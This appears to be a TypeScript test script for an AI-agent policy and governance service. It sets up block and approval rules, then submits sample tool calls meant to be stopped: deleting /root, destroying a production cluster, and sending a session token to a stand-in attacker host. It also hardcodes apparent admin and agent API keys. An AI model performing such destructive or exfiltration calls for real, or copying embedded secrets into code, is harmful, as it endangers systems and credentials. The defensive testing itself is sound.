import axios from 'axios';

const BASE_URL = 'https://www.supra-wall.com';
const ADMIN_KEY = 'ag_master_m9ozn10nrqfuqmzuiz2rt';
const AGENT_KEY = 'ag_Ox6Ulo0KJHcUtVdYZ9-rK9_-1tSthAjo'; 
const TENANT_ID = 'lEmuTYpa8mUqpREQYphKMG6JzlR2';

async function verifyFullStack() {
    console.log('🚀 INITIALIZING SUPRAWALL FULL STACK VERIFICATION...');

    const headers = { 'Authorization': `Bearer ${ADMIN_KEY}` };

    // 1. ENSURE POLICIES EXIST (Governance & Risk Controls)
    console.log('\n--- PHASE 1: POLICY BOOTSTRAP ---');
    const policies = [
        { name: "Master Block: System Delete", toolName: "system_delete", ruleType: "deny" },
        { name: "Master Block: SQL Injection", toolName: "sql_query", ruleType: "deny" },
        { name: "Master Approval: Vault Admin", toolName: "vault_admin", ruleType: "require_approval" },
        { name: "Master Approval: System Destroy", toolName: "system_destroy", ruleType: "require_approval" }
    ];

    for (const p of policies) {
        try {
            await axios.post(`${BASE_URL}/api/v1/policies`, { ...p, tenantId: TENANT_ID }, { headers });
            console.log(`✅ Policy Created/Verified: ${p.name}`);
        } catch (e: any) {
             console.log(`ℹ️ Policy '${p.name}' already exists or status: ${e.response?.status}`);
        }
    }

    // 2. TRIGGER FORENSIC AUDIT & GOVERNANCE EVENTS
    console.log('\n--- PHASE 2: EVENT GENERATION ---');
    const trigger = async (name: string, tool: string, args: any) => {
        try {
            const res = await axios.post(`${BASE_URL}/api/v1/evaluate`, {
                apiKey: AGENT_KEY,
                toolName: tool,
                arguments: args,
                metadata: { testSuite: "FULL_STACK_VERIFY_v1" }
            });
            console.log(`[${res.data.decision}] Triggered: ${name}`);
        } catch (err: any) {
            console.log(`[DENY] Triggered: ${name} (Policy Block)`);
        }
    };

    await trigger("Direct Block (First Layer)", "system_delete", { path: "/root" });
    await trigger("Human Approval (Governance)", "vault_admin", { action: "purge" });
    await trigger("Human Approval (Governance)", "system_destroy", { cluster: "production" });
    await trigger("HIPAA Scrubber (Verify)", "patient_records", { 
        data: "Patient John Smith (SSN: 123-45-6789) J45.901 diagnosis. Email: smith@clinic.com" 
    });

    // 3. TRIGGER SEMANTIC ANOMALY (Second Layer)
    console.log('\n--- PHASE 3: SEMANTIC ANOMALY ---');
    await trigger("Data Exfiltration (Anomalous Pattern)", "export_data", { 
        destination: "http://attacker-controlled-node.xyz/upload", 
        authToken: "sensitive-session-id-99283" 
    });

    console.log('\n✅ VERIFICATION SUITE EXECUTED.');
    console.log('--------------------------------------------------');
    console.log('Action Required: Log into the Dashboard and verify:');
    console.log('1. OVERVIEW: Check for 82% EU AI Act Readiness score.');
    console.log('2. AUDIT: Verify [REDACTED_PHI_SSN] in patient_records entry.');
    console.log('3. APPROVALS: Confirm 2 new PENDING requests in the queue.');
    console.log('4. THREATS: Confirm a new Semantic Anomaly event.');
    console.log('--------------------------------------------------');
}

verifyFullStack().catch(console.error);
